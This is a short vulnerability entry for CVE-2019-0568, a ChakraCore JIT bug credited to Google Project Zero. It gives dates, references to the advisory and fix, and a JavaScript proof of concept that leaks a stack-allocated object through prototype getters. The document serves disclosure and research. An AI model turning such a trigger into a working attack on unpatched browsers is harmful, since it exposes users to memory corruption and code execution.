# CVE-2019-0568

- Report: Nov 2018
- Fix: Jan 2019
- Credit: lokihardt of Google Project Zero

## PoC

```javascript
function opt() {
    let o = {};  // stack-allocated object
    o.x;  // under with DisableImplicitFlags set
}

function main() {
    for (let i = 0; i < 10000; i++) {
        opt();
    }

    let leaked_stack_object = null;
    let object_prototype = ({}).__proto__;
    object_prototype.__defineGetter__('x', Error.prototype.toString);
    object_prototype.__defineGetter__('message', function () {
        delete object_prototype.message;

        leaked_stack_object = this;
    });

    object_prototype.name = Array.prototype;  // access to Array.prototype will call JsBuiltInEngineInterfaceExtensionObject::InjectJsBuiltInLibraryCode.

    opt();

    alert(leaked_stack_object);
}

main();
```

## Reference

- [Microsoft](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0568)
- [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1709)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/d73c5f12d9c5cbbf64f59ae04e76a531b3e844b3)
